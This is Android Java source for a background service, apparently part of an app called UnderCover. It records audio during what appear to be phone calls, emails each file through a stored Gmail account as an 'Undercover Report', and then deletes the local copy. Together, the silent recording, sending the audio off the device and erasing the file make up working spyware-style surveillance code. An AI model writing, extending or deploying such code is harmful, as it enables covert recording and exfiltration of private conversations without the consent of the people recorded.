package com.pranayc.undercover;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;

import java.io.File;

public class RecordService extends Service
{
    private boolean recording = false;
    private MediaRecorder recorder;
    private File file = null;
    private String number;

    @Override
    public IBinder onBind(Intent intent)
    {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        int result = super.onStartCommand(intent, flags, startId);
        if(!recording)
        {
            number = intent.getStringExtra("Number");
            startRecording();
        }

        if(number==null || number.length()<1 || number.equals("Unknown Number"))
        {
            number = intent.getStringExtra("Number");
        }

        return result;
    }

    private void startRecording()
    {

        try
        {
            recorder = new MediaRecorder();
            recording = true;
            recorder.reset();
            recorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);

            final File folder = new File(Environment.getExternalStorageDirectory(), "UnderCover");
            if(!folder.exists())
            {
                folder.mkdir();
            }
            file = new File(folder, "rec_"+System.currentTimeMillis()+".3gpp");
            recorder.setOutputFile(file.getAbsolutePath());
            System.out.println("File = " + file);
            recorder.setOnInfoListener(new MediaRecorder.OnInfoListener()
            {
                @Override
                public void onInfo(MediaRecorder mr, int what, int extra)
                {
                    stopRecording(false);
                }
            });
            recorder.setOnErrorListener(new MediaRecorder.OnErrorListener()
            {
                @Override
                public void onError(MediaRecorder mr, int what, int extra)
                {
                    stopRecording(false);
                }
            });
            recorder.prepare();
            for(int i =0; i <10; i++)
            {
                try
                {
                    recorder.start();
                    break;
                }
                catch (Exception e)
                {
                    System.err.println(i + " ~ " +e.getLocalizedMessage());
                    Thread.sleep(200);
                }
            }
        }
        catch (Exception e)
        {
            stopRecording(true);
            e.printStackTrace();
        }
    }

    private void stopRecording(final boolean deleteFile)
    {
        recording = false;
        if(recorder!=null)
        {
            try
            {
                recorder.stop();
                recorder.reset();
                recorder.release();
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }

            if(deleteFile)
            {
                file.delete();
            }
            else
            {
                new Thread()
                {
                    @Override
                    public void run()
                    {
                        try
                        {
                            if(file.length() > 0)
                            {
                                if(sendMail(file.getAbsolutePath()))
                                {
                                    // Mail is sent. Delete the file //
                                    file.delete();
                                }
                            }
                            else
                            {
                                file.delete();
                            }
                        }
                        catch (Exception ex)
                        {
                            ex.printStackTrace();
                        }
                    }
                }.start();
            }
        }
    }

    private boolean sendMail(String absolutePath)
    {
        try
        {
            String username =  LocalStorage.get(this, "UserName");
            String password =  LocalStorage.get(this, "PassWord");
            if(username!=null && password!=null)
            {
                GMailSender sender = new GMailSender(username, password);
                sender.addAttachment(absolutePath, "Please find the attached media");
                sender.sendMail("Undercover Report # " + number, "Please find the attached media", username, username);
                return true;
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        return false;
    }

    @Override
    public void onDestroy()
    {
        stopRecording(false);
        super.onDestroy();
    }
}